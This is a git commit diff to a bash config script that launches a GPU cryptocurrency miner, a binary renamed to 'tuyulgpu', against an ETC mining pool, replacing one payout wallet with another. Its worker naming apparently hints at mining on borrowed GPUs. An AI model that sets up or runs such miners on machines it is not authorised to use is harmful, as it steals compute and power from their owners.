ce5fe78439d13052eaa2630a56f3de4fcc707b5e
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-10-19 23:33:54 +0700

    Update config.sh

--- config.sh
+++ config.sh
@@ -1,7 +1,6 @@
 #!/bin/bash
 POOL=etc.2miners.com:1010
-WALLET=BTT:TL9NcyCQYXEnRWCCHCTK3LqZJy7vNVpSZi
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
-chmod +x gpu
-./gpu --algo ETCHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
-timeout 10
+WALLET=0x11880b1cfe04907c5306222be1e09f4bbb480eb5
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-no1)
+chmod +x tuyulgpu
+./tuyulgpu --algo ETCHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
